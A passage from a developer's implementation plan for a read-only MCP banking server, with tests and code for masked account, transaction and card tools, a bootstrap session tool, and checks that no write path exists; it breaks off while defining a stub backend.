- Test: `tests/test_tools_accounts.py`

**Corrected against what execution actually found (2026-09-13):**

1. **The `result.structured_content["result"]` assumption was unverified when this plan was written; it has now been measured directly against fastmcp 4.0.3** (a throwaway in-process probe registering `list[Item]`, a single `Item`, and `list[str]` tools and printing `result.structured_content` for each). The plan's guess was correct and needed no fix: a tool returning `list[Model]` wraps the list under a `"result"` key (`{"result": [...]}`), while a tool returning a single `Model` is not wrapped at all — `structured_content` is that model's own fields directly, with no `"result"` key. The test file below exercises both shapes as written in the original plan.
2. **`def client_and_server():` is untyped**, which `mypy --strict` rejects (the same defect Tasks 4 and 7 already hit). Fixed to `def client_and_server() -> FastMCP:`.
3. **`ToolAnnotations(readOnlyHint=True, openWorldHint=False)` uses the deprecated camelCase kwargs.** `mcp.types.ToolAnnotations`'s actual field names are `read_only_hint` and `open_world_hint`; the camelCase spellings are accepted at runtime only via a deprecated compatibility alias (a `DeprecationWarning` fires on both construction and attribute access), and `mypy --strict` rejects them outright: `Unexpected keyword argument "readOnlyHint" for "ToolAnnotations"; did you mean "read_only_hint"?`. Fixed to the snake_case field names in both the tool registration and the test assertions (`.read_only_hint`, and `.input_schema` in place of the equally-deprecated `.inputSchema`).
4. **`facade/accounts.py`'s `list_accounts`/`get_balance` were typed against the concrete `BackendClient`, which `services/api/server.py` never holds.** `build_server` (Task 4) types its parameter `backend: BackendReader | None` specifically so it does not have to import Task 6's concrete client; the value it passes to `accounts_tools.register` after the `backend is not None` narrowing is a `BackendReader`, not a `BackendClient`. Typing the façade functions and `register`'s `backend` parameter against the concrete class made `mypy --strict` reject the call site. Fixed by typing all three (`list_accounts`, `get_balance`, `register`) against `postern_core.facade.protocol.BackendReader` instead — the same seam `build_server` already uses, and consistent with `BackendClient` satisfying it structurally without either module importing the other.

None of the four required a design change, only the fixes described. `Ref` (imported from `postern_core.domain.models`, not redefined) is already used for every `account_ref` parameter in the code below; this was verified, not assumed, by confirming `mypy --strict` passes and that a masked value is rejected before any backend request is issued (see the task report's adversarial pass).

- [ ] **Step 1: Write the failing test**

```python
# tests/test_tools_accounts.py
import httpx2
import pytest
from fastmcp.client import Client

from postern_core.facade.client import BackendClient, StubTokenMinter
from services.api.server import build_server
from services.api.settings import Settings
from tests.conftest import TEST_CUSTOMER
from tests.fixtures import backend_responses as fx

ROUTES = {"/accounts": fx.ACCOUNTS, "/accounts/acc_7f3a/balance": fx.BALANCE}


def _handler(request: httpx2.Request) -> httpx2.Response:
    body = ROUTES.get(request.url.path)
    return httpx2.Response(200, json=body) if body else httpx2.Response(404, json={})


@pytest.fixture
def client_and_server() -> FastMCP:
    backend = BackendClient(
        "https://backend.test", StubTokenMinter(), transport=httpx2.MockTransport(_handler)
    )
    return build_server(Settings.for_testing(), resolver=lambda: TEST_CUSTOMER, backend=backend)


async def test_accounts_list_returns_masked_ibans(client_and_server: FastMCP) -> None:
    async with Client(transport=client_and_server) as client:
        result = await client.call_tool("accounts.list", {})
    assert result.structured_content is not None
    ibans = [a["iban"] for a in result.structured_content["result"]]
    assert ibans == ["ES•• •••• 1332", "ES•• •••• 1119"]


async def test_accounts_list_returns_refs_not_backend_ids(client_and_server: FastMCP) -> None:
    async with Client(transport=client_and_server) as client:
        result = await client.call_tool("accounts.list", {})
    assert result.structured_content is not None
    assert [a["ref"] for a in result.structured_content["result"]] == ["acc_7f3a", "acc_9b21"]


async def test_get_balance_carries_currency_and_as_of(client_and_server: FastMCP) -> None:
    async with Client(transport=client_and_server) as client:
        result = await client.call_tool("accounts.get_balance", {"account_ref": "acc_7f3a"})
    balance = result.structured_content
    assert balance is not None
    assert balance["amount"] == {"amount": "1200.50", "currency": "EUR"}
    assert balance["as_of"].startswith("2026-09-12T10:00:00")
    assert balance["account_ref"] == "acc_7f3a"


async def test_tools_take_no_customer_argument(client_and_server: FastMCP) -> None:
    """The token is the identity (handoff §6.2)."""
    async with Client(transport=client_and_server) as client:
        tools = {t.name: t for t in await client.list_tools()}
    for name in ("accounts.list", "accounts.get_balance"):
        properties = tools[name].input_schema.get("properties", {})
        assert "user_id" not in properties
        assert "customer_id" not in properties
        assert "customer_ref" not in properties


async def test_read_tools_are_annotated_read_only(client_and_server: FastMCP) -> None:
    async with Client(transport=client_and_server) as client:
        tools = {t.name: t for t in await client.list_tools()}
    assert tools["accounts.list"].annotations is not None
    assert tools["accounts.list"].annotations.read_only_hint is True
    assert tools["accounts.get_balance"].annotations is not None
    assert tools["accounts.get_balance"].annotations.read_only_hint is True
```

`.inputSchema`/`.readOnlyHint` in the original draft are deprecated camelCase aliases (see the correction above); fixed to `.input_schema`/`.read_only_hint` above.

The executed version of `tests/test_tools_accounts.py` adds one more test beyond the five above, `test_get_balance_rejects_a_masked_value_as_the_ref`, covering the adversarial-pass finding that `Ref`'s pattern rejects a masked value before any backend request is built. See the file itself; not reproduced here to avoid drift between two copies of the same tests.

- [ ] **Step 2: Run the test to verify it fails**

Run: `uv run pytest tests/test_tools_accounts.py -q`
Expected: FAIL, the client raises because tool `accounts.list` is not registered.

- [ ] **Step 3: Write the façade projection**

```python
# packages/postern-core/src/postern_core/facade/accounts.py
"""Project backend account payloads onto the MCP contract (handoff §8.6)."""

from datetime import datetime
from decimal import Decimal
from typing import Any

from postern_core.domain.models import Account, Balance, Ref
from postern_core.domain.money import Money
from postern_core.facade.protocol import BackendReader
from postern_core.identity import CustomerRef

_AUDIENCE = "accounts.svc"


async def list_accounts(backend: BackendReader, customer: CustomerRef) -> list[Account]:
    payload = await backend.get_json("/accounts", customer=customer, audience=_AUDIENCE)
    return [
        Account(ref=row["id"], label=row["label"], iban=row["iban"])
        for row in payload["accounts"]
    ]


async def get_balance(backend: BackendReader, customer: CustomerRef, account_ref: Ref) -> Balance:
    payload: dict[str, Any] = await backend.get_json(
        f"/accounts/{account_ref}/balance", customer=customer, audience=_AUDIENCE
    )
    return Balance(
        account_ref=payload["account_id"],
        amount=Money(amount=Decimal(payload["amount"]), currency=payload["currency"]),
        as_of=datetime.fromisoformat(payload["as_of"]),
    )
```

`BackendReader` (Task 4's minimal `Protocol`), not the concrete `BackendClient`: see correction 4 above. `Ref` is imported, not redefined; it is already the pattern-constrained type from `postern_core.domain.models`, so `get_balance`'s `account_ref` parameter cannot accept a masked value — verified in the adversarial pass (a masked IBAN string as `account_ref` is rejected as an input-schema validation error before any backend request is issued, and the mock transport records zero calls).

Projection is explicit and field-by-field. Never pass a backend dict through: that is exactly how the `description` field in the fixtures leaks a PAN.

- [ ] **Step 4: Write the tools**

```python
# services/api/tools/accounts.py
from fastmcp import FastMCP
from mcp.types import ToolAnnotations

from postern_core.domain.models import Account, Balance, Ref
from postern_core.facade import accounts as facade
from postern_core.facade.protocol import BackendReader
from postern_core.identity import CustomerResolver

_READ = ToolAnnotations(read_only_hint=True, open_world_hint=False)


def register(mcp: FastMCP, resolver: CustomerResolver, backend: BackendReader) -> None:
    @mcp.tool(name="accounts.list", annotations=_READ)
    async def accounts_list() -> list[Account]:
        """List the customer's accounts with their refs, labels and masked IBANs.

        Use the returned `ref` for every other account argument. Call
        `banking_start_session` first if you have not already.
        """
        return await facade.list_accounts(backend, resolver())

    @mcp.tool(name="accounts.get_balance", annotations=_READ)
    async def accounts_get_balance(account_ref: Ref) -> Balance:
        """Current balance for one account, with currency and an `as_of` time.

        `account_ref` comes from `accounts.list`. Report the amount and currency
        exactly as returned; do not convert or round.
        """
        return await facade.get_balance(backend, resolver(), account_ref)
```

`ToolAnnotations(readOnlyHint=..., openWorldHint=...)` in the original draft used deprecated camelCase kwargs that `mypy --strict` rejects; fixed to `read_only_hint`/`open_world_hint` above (correction 3). `backend: BackendClient` in `register`'s signature is likewise fixed to `BackendReader` (correction 4) to match what `services/api/server.py` actually passes in.

Descriptions stay inside the ~500 character budget (handoff §4.3); measured at 213 and 212 characters for `accounts_list` and `accounts_get_balance` respectively. Cross-cutting workflow guidance lives in the bootstrap tool result, not repeated per tool.

- [ ] **Step 5: Register them in `server.py`**

Add the import and call inside `build_server`, immediately before the `return`:

```python
from services.api.tools import accounts as accounts_tools
```

```python
    server = FastMCP(
        name="postern",
        instructions=SERVER_INSTRUCTIONS,
        auth=auth,
        cache_scope="private",
        cache_ttl=settings.cache_ttl_seconds,
    )
    if backend is not None:
        accounts_tools.register(server, resolver, backend)
    return server
```

`settings.cache_ttl_ms` in the original draft is stale: Task 4's correction 2 renamed this field to `cache_ttl_seconds` before Task 8 was ever executed, but this snippet had not been updated to match. Fixed above.

Replace the bare `return FastMCP(...)` from Task 4 with this form. The `backend is not None` guard keeps Task 4's assembly tests valid.

- [ ] **Step 6: Add the golden masking cases**

In `tests/test_masking_golden.py`, replace the empty `CASES` with:

```python
CASES: dict[str, dict] = {
    "accounts.list": {},
    "accounts.get_balance": {"account_ref": "acc_7f3a"},
}
```

- [ ] **Step 7: Run the tests**

Run: `uv run pytest tests/test_tools_accounts.py tests/test_masking_golden.py -q`
Expected: PASS. The 6 tests in tests/test_tools_accounts.py pass (5 from the original draft plus the masked-ref-rejection test from the adversarial pass), and the previously green tests/test_masking_golden.py stays green (12 tests total across both files).

- [ ] **Step 8: Commit**

```bash
git add packages/postern-core/src/postern_core/facade/accounts.py services/api/tools/accounts.py \
        services/api/server.py tests/test_tools_accounts.py tests/test_masking_golden.py
git commit -m "feat(tools): accounts.list and accounts.get_balance over the stubbed backend"
```

---

### Task 9: `transactions.list` with a bounded window and scrubbed free text

**Files:**
- Create: `packages/postern-core/src/postern_core/facade/transactions.py`
- Create: `services/api/tools/transactions.py`
- Modify: `services/api/server.py`, `tests/test_masking_golden.py`
- Test: `tests/test_tools_transactions.py`

**Corrected against what execution actually found (2026-09-12, security review of Task 3,
second round):** the plan originally had this task add a `scrub_free_text` function to
`masking.py` and call it by hand in the façade projection
(`description=scrub_free_text(row["description"])`). That is "a function someone
remembers to call," which this module's own premise forbids (masking is a type property,
not a function someone remembers to call). `FreeText` — added to `masking.py` in Task 3's
second security-review round, not here — closes the same gap at the type level:
`Transaction.description` and `Transaction.counterparty_name` are already `FreeText`, so
the redaction happens on validation regardless of whether the façade author remembers to
call anything. This task no longer modifies `masking.py`, adds no `scrub_free_text`, and
the façade projection below passes `row["description"]` straight through. What survives
from the original plan is the *test* that redaction actually happens end-to-end through
this tool — see Step 1's `test_free_text_description_is_scrubbed`, updated to match
`FreeText`'s masked form (`•••• last4` / `XX•• •••• last4`, the same shape as
`MaskedPan`/`MaskedIban`) rather than the literal string `"[redacted]"`.

Two controls meet here. Handoff §6.5: "Bound result sets hard. Transactions default to 30 days, explicit widening required. One unbounded call persists five years of history permanently, somewhere we cannot reach." And: counterparty account numbers are omitted entirely, name only. The fixture's `description` embeds a full PAN and IBAN in free text; `Transaction.description: FreeText` closes that at the model boundary rather than in this task's façade code.

- [ ] **Step 1: Write the failing test**

```python
# tests/test_tools_transactions.py
import httpx2
import pytest
from fastmcp.client import Client

from postern_core.facade.client import BackendClient, StubTokenMinter
from services.api.server import build_server
from services.api.settings import Settings
from tests.conftest import TEST_CUSTOMER
from tests.fixtures import backend_responses as fx

SEEN: list[httpx2.Request] = []


def _handler(request: httpx2.Request) -> httpx2.Response:
    SEEN.append(request)
    return httpx2.Response(200, json=fx.TRANSACTIONS)


@pytest.fixture
def server():
    SEEN.clear()
    backend = BackendClient(
        "https://backend.test", StubTokenMinter(), transport=httpx2.MockTransport(_handler)
    )
    return build_server(Settings.for_testing(), resolver=lambda: TEST_CUSTOMER, backend=backend)


async def test_default_window_is_thirty_days(server) -> None:
    async with Client(transport=server) as client:
        await client.call_tool("transactions.list", {"account_ref": "acc_7f3a"})
    assert SEEN[0].url.params["days"] == "30"


async def test_window_can_be_widened_explicitly(server) -> None:
    async with Client(transport=server) as client:
        await client.call_tool("transactions.list", {"account_ref": "acc_7f3a", "days": 90})
    assert SEEN[0].url.params["days"] == "90"


async def test_window_is_capped(server) -> None:
    async with Client(transport=server) as client:
        result = await client.call_tool(
            "transactions.list", {"account_ref": "acc_7f3a", "days": 4000}, raise_on_error=False
        )
    assert result.is_error


async def test_counterparty_account_is_absent_from_the_result(server) -> None:
    async with Client(transport=server) as client:
        result = await client.call_tool("transactions.list", {"account_ref": "acc_7f3a"})
    row = result.structured_content["result"][0]
    assert row["counterparty_name"] == "Acme Ltd"
    assert "counterparty_iban" not in row


async def test_free_text_description_is_scrubbed(server) -> None:
    """`Transaction.description` is `FreeText` (Task 3, second security-review
    round): the redaction happens on model validation inside `Transaction(...)`,
    not because this façade remembers to call a scrub function. Asserts the
    masked *form* (same shape as `MaskedPan`/`MaskedIban`), not the literal
    string "[redacted]" the original plan expected from a since-dropped
    `scrub_free_text`."""
    async with Client(transport=server) as client:
        result = await client.call_tool("transactions.list", {"account_ref": "acc_7f3a"})
    description = result.structured_content["result"][0]["description"]
    assert fx.FULL_PAN not in description
    assert fx.COUNTERPARTY_IBAN not in description
    assert "•••• " in description


async def test_direction_is_derived_from_the_sign(server) -> None:
    async with Client(transport=server) as client:
        result = await client.call_tool("transactions.list", {"account_ref": "acc_7f3a"})
    assert result.structured_content["result"][0]["direction"] == "debit"
```

- [ ] **Step 2: Run the tests to verify they fail**

Run: `uv run pytest tests/test_tools_transactions.py -q`
Expected: FAIL, `ModuleNotFoundError: No module named 'postern_core.facade.transactions'`

- [ ] **Step 3: Write the façade projection**

```python
# packages/postern-core/src/postern_core/facade/transactions.py
from datetime import datetime
from decimal import Decimal

from postern_core.domain.models import Ref, Transaction
from postern_core.domain.money import Money
from postern_core.facade.client import BackendClient
from postern_core.identity import CustomerRef

_AUDIENCE = "transactions.svc"
MAX_DAYS = 365


async def list_transactions(
    backend: BackendClient, customer: CustomerRef, account_ref: Ref, days: int
) -> list[Transaction]:
    payload = await backend.get_json(
        "/transactions",
        customer=customer,
        audience=_AUDIENCE,
        params={"account_id": account_ref, "days": days},
    )
    return [_project(row) for row in payload["transactions"]]


def _project(row: dict) -> Transaction:
    amount = Decimal(row["amount"])
    return Transaction(
        ref=row["id"],
        account_ref=row["account_id"],
        booked_at=datetime.fromisoformat(row["booked_at"]),
        amount=Money(amount=abs(amount), currency=row["currency"]),
        direction="debit" if amount < 0 else "credit",
        counterparty_name=row["counterparty_name"],
        description=row["description"],
    )
```

`description=row["description"]` is passed straight through, not
`scrub_free_text(row["description"])`: `Transaction.description` is `FreeText`, so
construction itself redacts any embedded PAN or IBAN. A façade author who forgets
something here cannot reproduce the original leak, which is the point — the type carries
the control, not this function's discipline.

`counterparty_iban` is read from the backend row and never carried forward. The `Transaction` model has no field for it, so a future contributor who tries gets a validation error from `extra="forbid"`.

- [ ] **Step 4: Write the tool**

```python
# services/api/tools/transactions.py
from typing import Annotated

from fastmcp import FastMCP
from mcp.types import ToolAnnotations
from pydantic import Field

from postern_core.domain.models import Ref, Transaction
from postern_core.facade import transactions as facade
from postern_core.facade.client import BackendClient
from postern_core.identity import CustomerResolver

_READ = ToolAnnotations(readOnlyHint=True, openWorldHint=False)


def register(mcp: FastMCP, resolver: CustomerResolver, backend: BackendClient) -> None:
    @mcp.tool(name="transactions.list", annotations=_READ)
    async def transactions_list(
        account_ref: Ref,
        days: Annotated[int, Field(ge=1, le=facade.MAX_DAYS)] = 30,
    ) -> list[Transaction]:
        """Transactions for one account, newest first, last 30 days by default.

        Widen with `days` only when the customer asked for an older period.
        Counterparty account numbers are not available through this channel;
        the counterparty name is. Amounts are positive with a `direction`.
        """
        return await facade.list_transactions(backend, resolver(), account_ref, days)
```

The cap is enforced by the schema, so an out-of-range `days` is rejected before any backend call.

- [ ] **Step 5: Register and add the golden case**

In `server.py`, inside the `if backend is not None:` block: `transactions_tools.register(server, resolver, backend)` with the matching import. In `tests/test_masking_golden.py`, add to `CASES`:

```python
    "transactions.list": {"account_ref": "acc_7f3a"},
```

- [ ] **Step 6: Run the tests**

Run: `uv run pytest tests/test_tools_transactions.py tests/test_masking_golden.py -q`
Expected: PASS. The 6 tests in `tests/test_tools_transactions.py` pass (including
`test_free_text_description_is_scrubbed`, proving `FreeText` redacts through this tool
end-to-end), and the previously green `tests/test_masking_golden.py` stays green.

- [ ] **Step 7: Commit**

```bash
git add packages/postern-core/src/postern_core/facade/transactions.py \
        services/api/tools/transactions.py services/api/server.py \
        tests/test_tools_transactions.py tests/test_masking_golden.py
git commit -m "feat(tools): transactions.list with a bounded window"
```

---

### Task 10: `cards.list`

**Files:**
- Create: `packages/postern-core/src/postern_core/facade/cards.py`
- Create: `services/api/tools/cards.py`
- Modify: `services/api/server.py`, `tests/test_masking_golden.py`
- Test: `tests/test_tools_cards.py`

- [ ] **Step 1: Write the failing test**

```python
# tests/test_tools_cards.py
import httpx2
import pytest
from fastmcp.client import Client

from postern_core.facade.client import BackendClient, StubTokenMinter
from services.api.server import build_server
from services.api.settings import Settings
from tests.conftest import TEST_CUSTOMER
from tests.fixtures import backend_responses as fx


def _handler(request: httpx2.Request) -> httpx2.Response:
    return httpx2.Response(200, json=fx.CARDS)


@pytest.fixture
def server():
    backend = BackendClient(
        "https://backend.test", StubTokenMinter(), transport=httpx2.MockTransport(_handler)
    )
    return build_server(Settings.for_testing(), resolver=lambda: TEST_CUSTOMER, backend=backend)


async def test_cards_list_masks_the_pan_to_last_four(server) -> None:
    async with Client(transport=server) as client:
        result = await client.call_tool("cards.list", {})
    assert result.structured_content["result"][0]["pan"] == "•••• 4417"


async def test_cards_list_never_returns_expiry_or_cvv(server) -> None:
    async with Client(transport=server) as client:
        result = await client.call_tool("cards.list", {})
    row = result.structured_content["result"][0]
    assert set(row) == {"ref", "label", "pan", "status"}


async def test_cards_list_is_annotated_read_only(server) -> None:
    async with Client(transport=server) as client:
        tools = {t.name: t for t in await client.list_tools()}
    assert tools["cards.list"].annotations.readOnlyHint is True
```

- [ ] **Step 2: Run the test to verify it fails**

Run: `uv run pytest tests/test_tools_cards.py -q`
Expected: FAIL, tool `cards.list` is not registered.

- [ ] **Step 3: Write the façade projection**

```python
# packages/postern-core/src/postern_core/facade/cards.py
from postern_core.domain.models import Card
from postern_core.facade.client import BackendClient
from postern_core.identity import CustomerRef

_AUDIENCE = "cards.svc"


async def list_cards(backend: BackendClient, customer: CustomerRef) -> list[Card]:
    payload = await backend.get_json("/cards", customer=customer, audience=_AUDIENCE)
    return [
        Card(ref=row["id"], label=row["label"], pan=row["pan"], status=row["status"])
        for row in payload["cards"]
    ]
```

Handoff §6.5 prefers the backend returning pre-masked values so this server never holds a full PAN and stays out of PCI DSS scope. That is open question §10.17. Until it is answered, `MaskedPan` masks on construction here and the full PAN exists in this process only for the duration of one projection.

- [ ] **Step 4: Write the tool**

```python
# services/api/tools/cards.py
from fastmcp import FastMCP
from mcp.types import ToolAnnotations

from postern_core.domain.models import Card
from postern_core.facade import cards as facade
from postern_core.facade.client import BackendClient
from postern_core.identity import CustomerResolver

_READ = ToolAnnotations(readOnlyHint=True, openWorldHint=False)


def register(mcp: FastMCP, resolver: CustomerResolver, backend: BackendClient) -> None:
    @mcp.tool(name="cards.list", annotations=_READ)
    async def cards_list() -> list[Card]:
        """List the customer's cards with their refs, labels and last four digits.

        Card numbers are shown as the last four digits only and cannot be used
        to transact. Expiry dates and security codes are never available here.
        """
        return await facade.list_cards(backend, resolver())
```

- [ ] **Step 5: Register and add the golden case**

`cards_tools.register(server, resolver, backend)` in `server.py`, and in `CASES`:

```python
    "cards.list": {},
```

- [ ] **Step 6: Run the tests**

Run: `uv run pytest tests/test_tools_cards.py tests/test_masking_golden.py -q`
Expected: PASS. The 3 tests in tests/test_tools_cards.py pass, and the previously green tests/test_masking_golden.py stays green.

- [ ] **Step 7: Commit**

```bash
git add packages/postern-core/src/postern_core/facade/cards.py services/api/tools/cards.py \
        services/api/server.py tests/test_tools_cards.py tests/test_masking_golden.py
git commit -m "feat(tools): cards.list with last-four masking"
```

---

### Task 11: `banking_start_session` bootstrap tool

**Files:**
- Create: `services/api/tools/bootstrap.py`
- Modify: `services/api/server.py`, `tests/test_masking_golden.py`
- Test: `tests/test_bootstrap.py`

Handoff §4.2, marked "required, do not skip": client support for server `instructions` is inconsistent, so the bootstrap tool is the only context-delivery mechanism that works everywhere, because it arrives as a tool result. Consent state is hardcoded to "granted" here and becomes real in Plan 2.

- [ ] **Step 1: Write the failing test**

```python
# tests/test_bootstrap.py
import httpx2
import pytest
from fastmcp.client import Client

from postern_core.facade.client import BackendClient, StubTokenMinter
from services.api.server import build_server
from services.api.settings import Settings
from tests.conftest import TEST_CUSTOMER
from tests.fixtures import backend_responses as fx


def _handler(request: httpx2.Request) -> httpx2.Response:
    return httpx2.Response(200, json=fx.ACCOUNTS)


@pytest.fixture
def server():
    backend = BackendClient(
        "https://backend.test", StubTokenMinter(), transport=httpx2.MockTransport(_handler)
    )
    return build_server(Settings.for_testing(), resolver=lambda: TEST_CUSTOMER, backend=backend)


async def test_bootstrap_returns_accounts_with_masked_ibans(server) -> None:
    async with Client(transport=server) as client:
        result = await client.call_tool("banking_start_session", {})
    assert result.structured_content["accounts"][0]["iban"] == "ES•• •••• 1332"


async def test_bootstrap_reports_no_write_capability_in_this_release(server) -> None:
    async with Client(transport=server) as client:
        result = await client.call_tool("banking_start_session", {})
    assert result.structured_content["write_enabled"] == []


async def test_bootstrap_explains_the_confirmation_model(server) -> None:
    async with Client(transport=server) as client:
        result = await client.call_tool("banking_start_session", {})
    note = result.structured_content["confirmation_note"]
    assert "banking app" in note


async def test_bootstrap_lists_consent_per_domain(server) -> None:
    async with Client(transport=server) as client:
        result = await client.call_tool("banking_start_session", {})
    domains = {c["domain"] for c in result.structured_content["consents"]}
    assert domains == {"accounts", "transactions", "cards", "payments"}


async def test_server_instructions_point_at_the_bootstrap_tool() -> None:
    from services.api.server import SERVER_INSTRUCTIONS

    assert "banking_start_session" in SERVER_INSTRUCTIONS
```

- [ ] **Step 2: Run the test to verify it fails**

Run: `uv run pytest tests/test_bootstrap.py -q`
Expected: FAIL, tool `banking_start_session` is not registered.

- [ ] **Step 3: Write the tool**

```python
# services/api/tools/bootstrap.py
"""The bootstrap tool (handoff §4.2).

Load-bearing: it is the only context-delivery mechanism that works across every
client, because it arrives as a tool result rather than as protocol metadata.
Personalised context beats a static instruction blob for a banking server.
"""

from fastmcp import FastMCP
from mcp.types import ToolAnnotations

from postern_core.domain.models import ConsentSummary, SessionInfo
from postern_core.facade import accounts as accounts_facade
from postern_core.facade.client import BackendClient
from postern_core.identity import CustomerResolver

_READ = ToolAnnotations(readOnlyHint=True, openWorldHint=False)

_CONFIRMATION_NOTE = (
    "This session can read accounts, transactions and cards. It cannot move "
    "money or change anything. When write operations are enabled, they are "
    "approved by the customer in their banking app, never in this conversation."
)

_DOMAINS = ("accounts", "transactions", "cards", "payments")
_READABLE = {"accounts", "transactions", "cards"}


def register(mcp: FastMCP, resolver: CustomerResolver, backend: BackendClient) -> None:
    @mcp.tool(name="banking_start_session", annotations=_READ)
    async def banking_start_session() -> SessionInfo:
        """Start here. Returns the customer's accounts, what this session may do,
        and how confirmations work. Call this before any other banking tool.
        """
        customer = resolver()
        return SessionInfo(
            accounts=await accounts_facade.list_accounts(backend, customer),
            consents=[
                ConsentSummary(domain=d, granted=d in _READABLE, expires_at=None)
                for d in _DOMAINS
            ],
            write_enabled=[],
            confirmation_note=_CONFIRMATION_NOTE,
        )
```

`write_enabled=[]` and `granted=False` for payments are accurate statements about this release, not placeholders: no write tool exists (handoff §6.2), and Plan 2 replaces the hardcoded consent list with the Postgres-backed one.

- [ ] **Step 4: Register and add the golden case**

`bootstrap_tools.register(server, resolver, backend)` in `server.py`, and in `CASES`:

```python
    "banking_start_session": {},
```

- [ ] **Step 5: Run the tests**

Run: `uv run pytest tests/test_bootstrap.py tests/test_masking_golden.py -q`
Expected: PASS. The 5 tests in tests/test_bootstrap.py pass, and the previously green tests/test_masking_golden.py stays green.

- [ ] **Step 6: Commit**

```bash
git add services/api/tools/bootstrap.py services/api/server.py \
        tests/test_bootstrap.py tests/test_masking_golden.py
git commit -m "feat(tools): banking_start_session bootstrap tool"
```

---

### Task 12: Wire the ASGI app and prove the write boundary

**Files:**
- Create: `services/api/main.py`
- Test: `tests/test_no_write_from_api.py`, `tests/test_asgi_app.py`

`Settings.from_env()` must not run at import time in `server.py`, or every test that imports it needs the full environment. Composition lives in `main.py`; uvicorn targets `services.api.main:app`.

- [ ] **Step 1: Write the failing tests**

```python
# tests/test_no_write_from_api.py
"""The §6.2 and A3 controls expressed as tests.

lint-imports enforces the static boundary. These assert the runtime shape:
no write capability exists in the tool surface at all.
"""

import inspect
import typing

import httpx2
import pytest
from fastmcp.client import Client

from postern_core.domain.masking import MaskedIban, MaskedPan
from postern_core.facade import accounts, cards, transactions
from postern_core.facade.client import BackendClient, StubTokenMinter
from services.api.server import build_server
from services.api.settings import Settings
from tests.conftest import TEST_CUSTOMER

FORBIDDEN_NAME_PARTS = ("execute", "submit", "create_payment", "transfer", "pay")


@pytest.fixture
def server():
    backend = BackendClient(
        "https://backend.test",
        StubTokenMinter(),
        transport=httpx2.MockTransport(lambda r: httpx2.Response(200, json={"accounts": []})),
    )
    return build_server(Settings.for_testing(), resolver=lambda: TEST_CUSTOMER, backend=backend)


async def test_no_tool_name_suggests_execution(server) -> None:
    async with Client(transport=server) as client:
        names = [t.name for t in await client.list_tools()]
    for name in names:
        assert not any(part in name.lower() for part in FORBIDDEN_NAME_PARTS), name


async def test_every_registered_tool_is_annotated_read_only(server) -> None:
    async with Client(transport=server) as client:
        tools = await client.list_tools()
    assert tools, "expected tools to be registered"
    for tool in tools:
        assert tool.annotations is not None, tool.name
        assert tool.annotations.readOnlyHint is True, tool.name


def test_the_facade_exposes_no_write_helpers() -> None:
    for module in (accounts, transactions, cards):
        for name, obj in inspect.getmembers(module, inspect.iscoroutinefunction):
            assert not name.startswith(("create_", "update_", "delete_", "post_")), (
                f"{module.__name__}.{name}"
            )


def test_the_api_service_does_not_import_the_confirm_service() -> None:
    import services.api.server as api_server

    source = inspect.getsource(inspect.getmodule(api_server))
    assert "services.confirm" not in source


async def test_no_tool_parameter_accepts_a_masked_type(server) -> None:
    """A parameter typed MaskedPan or MaskedIban would accept an
    already-masked value as an input identifier, which handoff §6.5
    forbids. Return annotations may use these types; parameters may not."""
    for tool in await server.list_tools():
        hints = typing.get_type_hints(tool.fn, include_extras=True)
        for param_name, hint in hints.items():
            if param_name == "return":
                continue
            assert hint != MaskedPan, f"{tool.name}.{param_name} accepts MaskedPan"
            assert hint != MaskedIban, f"{tool.name}.{param_name} accepts MaskedIban"
```

This turns the output-only rule from Task 2 into something a passing test suite enforces, not something a reviewer has to remember to check.

```python
# tests/test_asgi_app.py
from services.api.main import create_app
from services.api.settings import Settings


def test_create_app_returns_an_asgi_callable() -> None:
    app = create_app(Settings.for_testing())
    assert callable(app)


def test_create_app_installs_header_validation() -> None:
    from services.api.asgi.header_validation import HeaderBodyValidation

    app = create_app(Settings.for_testing())
    installed = [m.cls for m in app.user_middleware]
    assert HeaderBodyValidation in installed


def test_the_app_exposes_a_lifespan() -> None:
    app = create_app(Settings.for_testing())
    assert app.router.lifespan_context is not None
```

- [ ] **Step 2: Run the tests to verify they fail**

Run: `uv run pytest tests/test_no_write_from_api.py tests/test_asgi_app.py -q`
Expected: FAIL, `ModuleNotFoundError: No module named 'services.api.main'`

- [ ] **Step 3: Write `main.py`**

```python
# services/api/main.py
"""Composition root. uvicorn targets `services.api.main:app`."""

from starlette.middleware import Middleware

from postern_core.facade.client import BackendClient, StubTokenMinter
from services.api.asgi.header_validation import HeaderBodyValidation
from services.api.server import build_server, token_customer_resolver
from services.api.settings import Settings


def create_app(settings: Settings | None = None):
    settings = settings or Settings.from_env()
    backend = BackendClient(settings.backend_base_url, StubTokenMinter())
    server = build_server(settings, token_customer_resolver, backend)
    return server.http_app(
        path="/mcp",
        stateless_http=True,
        json_response=True,
        middleware=[Middleware(HeaderBodyValidation, strict=settings.strict_headers)],
    )


app = create_app()
```

`stateless_http=True` and `json_response=True` are what let any request land on any instance behind a plain load balancer (handoff §3.2). When Plan 4 mounts the OAuth routes alongside this app in a parent Starlette app, the parent **must** receive `mcp_app.lifespan`, or FastMCP's session manager stays uninitialised.

- [ ] **Step 4: Run the tests to verify they pass**

Run: `uv run pytest tests/test_no_write_from_api.py tests/test_asgi_app.py -q`
Expected: PASS. The 5 tests in tests/test_no_write_from_api.py and the 3 tests in tests/test_asgi_app.py pass.

- [ ] **Step 5: Prove the import-linter contract actually bites**

```bash
echo "from services.confirm import *  # noqa" >> services/api/server.py
uv run lint-imports; echo "exit=$?"
git checkout services/api/server.py
uv run lint-imports; echo "exit=$?"
```

Expected: first run prints `Contracts: 0 kept, 1 broken.` and `exit=1`; second prints `Contracts: 1 kept, 0 broken.` and `exit=0`. A contract nobody has seen fail is not a control.

- [ ] **Step 6: Commit**

```bash
git add services/api/main.py tests/test_no_write_from_api.py tests/test_asgi_app.py
git commit -m "feat(api): ASGI composition root and write-boundary tests"
```

---

### Task 13: Two-target image and local stack

**Files:**
- Create: `Dockerfile`, `.dockerignore`, `docker-compose.yml`, `stub/backend.py`

Handoff §12.2: two images from one repo, same source, different final stage, so an RCE in the read container does not even find the write path's code. `services/confirm` is empty in this plan; the target exists so the split is real in the registry from the first build.

- [ ] **Step 1: Write the stub backend**

```python
# stub/backend.py
"""Stub of the bank's domain services for local development (handoff §8.7)."""

from starlette.applications import Starlette
from starlette.responses import JSONResponse
from starlette.routing import Route

ACCOUNTS = {
    "accounts": [
        {"id": "acc_7f3a", "label": "Joint expenses", "iban": "ES9121000418450200051332"}
    ]
}
BALANCE = {
    "account_id": "acc_7f3a",
    "amount": "1200.50",
    "currency": "EUR",
    "as_of": "2026-09-12T10:00:00Z",
}
TRANSACTIONS = {
    "transactions": [
        {
